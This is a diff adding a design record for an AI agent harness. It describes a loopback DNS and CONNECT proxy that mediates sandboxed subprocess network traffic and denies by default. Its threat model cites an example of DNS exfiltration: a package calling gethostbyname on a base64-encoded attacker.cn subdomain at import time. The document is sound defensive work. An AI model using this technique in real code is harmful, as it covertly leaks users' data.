@@ -11789,3 +11789,89 @@ In-app visual pass deferred with the ADR-0163 one (same packaged-Electron debt).
 
 ADR-0029 (P-IDE.1 - the curated picker this pins on top of), ADR-0132 (P-PERF.5 memo key
 extended), ADR-0158/0163 (pure-builder + localStorage-preference conventions reused).
+
+-----
+
+## ADR-0166 - P-SANDBOX.2: mediated subprocess egress (the loopback DNS + CONNECT proxy), BUILT
+
+**Date:** 2026-07-05
+**Status:** Accepted / Built. Increment 2 of the ADR-0157 epic (P-SANDBOX.3 events/Security-panel next).
+**Increment:** P-SANDBOX.2.
+
+### What shipped
+
+P-SANDBOX.1 made the DECLARED `canNetwork` cap real for the DOWNGRADE profiles (a suspicious/quarantined
+chain gets `--unshare-net` - total deny). But the COMMON case (`trusted-local`, `canNetwork:true`) still
+ran with raw, unmediated network, so ADR-0157's named threat survived: a benign-looking `pip install`
+whose package does `socket.gethostbyname("<b64>.attacker.cn")` at import time could exfil over DNS,
+in-process, after `execve` returned. Cutting the network there would break every legitimate reach-out.
+
+This increment is the middle path - for `canNetwork:true` the sandbox's only route out is a **loopback
+DNS resolver + HTTP CONNECT proxy the harness runs**, and every DNS query + every CONNECT is decided by
+the EXACT SAME brain the agent's own browser/web tools use (`egressDecisionDetailed`, ADR-0062/0106/0108):
+
+- **`harness/runs/egress_proxy.ts`** (new, TS/Bun - inv #2): the pure decision keystone `decideEgress()`
+  (over-tested) + a real UDP/53 DNS forwarder + a TCP CONNECT proxy + a `start()/stop()` lifecycle + an
+  in-memory event log. **Fail-closed (inv #3): ONLY an explicit `allow` verdict passes.** A `prompt`
+  verdict (foreign ccTLD / public-IP literal under P-NETWL.5's still-prompt heuristics), an unparseable
+  host, or a decision that THROWS all DENY - a subprocess libc call cannot be interactively approved
+  mid-syscall, so "cannot decide" is a refusal, never a resolve. A denied query gets a REFUSED (RCODE 5)
+  reply WITHOUT the upstream ever being contacted; an allowed query is forwarded + relayed verbatim.
+- **`harness/runs/sandbox_exec.ts`**: `SandboxCtx.proxy` (a plain path/URL record - the seam stays pure).
+  `BwrapBackend.wrap` now has THREE network states for `canNetwork:true`: **+proxy** ⇒ mediated (bind the
+  generated resolv.conf over /etc/resolv.conf when we hold a privileged :53, set HTTP(S)_PROXY so
+  pip/requests/curl tunnel through us); **no proxy** ⇒ fall back to `--unshare-net` (no mediator ⇒ no
+  network - fail-closed, never raw unmediated egress). `canNetwork:false` is unchanged (`--unshare-net`).
+- **Wired at BOTH omp spawns**: `harness/launcher/lucid_acp.ts` (`execGated`, via injectable `proxyStart`)
+  and `desktop/acp_backend.ts` (`resolveSandboxPlan`, now async; `ACPClient` gained a per-child env
+  overlay so HTTP(S)_PROXY reaches the omp child WITHOUT polluting the desktop's own `process.env`). Both
+  start the proxy ONLY on an isolating backend + `canNetwork:true`; a passthrough (macOS/Windows) has
+  nothing to steer and discloses as un-isolated, exactly as in .1.
+
+Reuse, never re-derive (inv): the still-prompt heuristics already live inside `egressDecisionDetailed`, so
+mapping `prompt → deny` here extends them to subprocess DNS for free - subprocess egress obeys the SAME
+curated whitelist (P-NETWL), managed ceiling (P-ENT.1), and posture (P-NETWL.5) the user already curates.
+
+### Deliberate deltas from the ADR-0157 text (recorded, not silent)
+
+1. **DNS steering degrades gracefully instead of bricking the network.** A stub resolver's `resolv.conf`
+   can only name a `nameserver` (no port), so mediated DNS needs a privileged in-namespace `:53`. The
+   proxy TRIES `:53` and, if unprivileged, **falls back to an ephemeral port** rather than failing to
+   start; the caller then binds resolv.conf ONLY when `:53` was obtained, otherwise mediates HTTP(S) only
+   and leaves DNS with the host resolver. This keeps `trusted-local` runs on Linux from silently losing
+   all networking. The privileged in-namespace `:53` bind + raw-IP-socket funnelling (slirp4netns-style,
+   so a socket that ignores HTTP_PROXY is FORWARDED not merely dropped by `--unshare-net`) remain
+   **P-SANDBOX.4** - ADR-0157's Consequences already scoped them there.
+2. **No new EventNames (inv #8).** The proxy keeps an in-memory, observable `events[]` log; the formal
+   `dns_query_blocked` / `subprocess_egress_blocked` `EventName` additions + the Security-panel surfacing
+   + the LIVE kill-the-proxy regression test are **P-SANDBOX.3** (its own contracts increment), exactly as
+   ADR-0157 phased. This increment's kill-the-proxy proof lives at the proxy level (a stopped proxy
+   resolves/connects nothing) in `egress_proxy.test.ts` + the demo.
+3. **The util-omp spawn (`startUtil`) stays unsandboxed**, matching P-SANDBOX.1's scope (it never went
+   through `resolveSandboxPlan`); wrapping it is a future item, not silently regressed here.
+
+### Verification
+
+`egress_proxy.test.ts` (34 assertions with sandbox_exec): decision keystone (allow passes; prompt /
+unparseable / thrown all deny), host normalization, DNS QNAME parse + REFUSED bytes, live DNS
+deny⇒REFUSED-and-upstream-untouched / allow⇒relayed, live CONNECT deny⇒403 / allow⇒tunnelled, and
+kill-the-proxy. `demo-P-SANDBOX.2` green. The two P-SANDBOX.1 assertions that FORWARD-REFERENCED ".2"
+(trusted-local "keeps network") were updated to the new post-.2 truth (no proxy ⇒ `--unshare-net`; proxy
+⇒ mediated). Full `make test` green but for the pre-existing Windows-only fs_browse/theme-asset failures
+(path-separator; green on Linux CI).
+
+### Invariants preserved
+
+Inv #1 (wrap the omp process we spawn - no omp fork). Inv #2 (all new code TS/Bun; the scanner stays the
+only Python; the rejected audit-hook path would have violated this). Inv #3 (fail-closed extends to the
+new layer: only `allow` passes; proxy dead ⇒ egress denied; no mediator ⇒ no network). Inv #4 (the
+in-process gate is untouched, still runs on every OS beneath this). Inv #6 (runtime only - the frozen
+prompt prefix is not touched). Inv #7 (no new trust labels). Inv #8 (no new EventNames - quarantined to
+P-SANDBOX.3).
+
+### Relates to
+
+ADR-0157 (the P-SANDBOX epic + threat model this fulfils), ADR-0159 (P-SANDBOX.1, the seam this extends),
+ADR-0062/0106/0108 (P-EGRESS/P-NETWL - the `egressDecisionDetailed` brain + still-prompt posture REUSED
+for subprocess traffic), ADR-0068 (P-ENT.1 - the managed ceiling that also governs subprocess egress),
+`harness/runs/profiles.ts` (the `canNetwork` cap this finally mediates rather than merely denies).
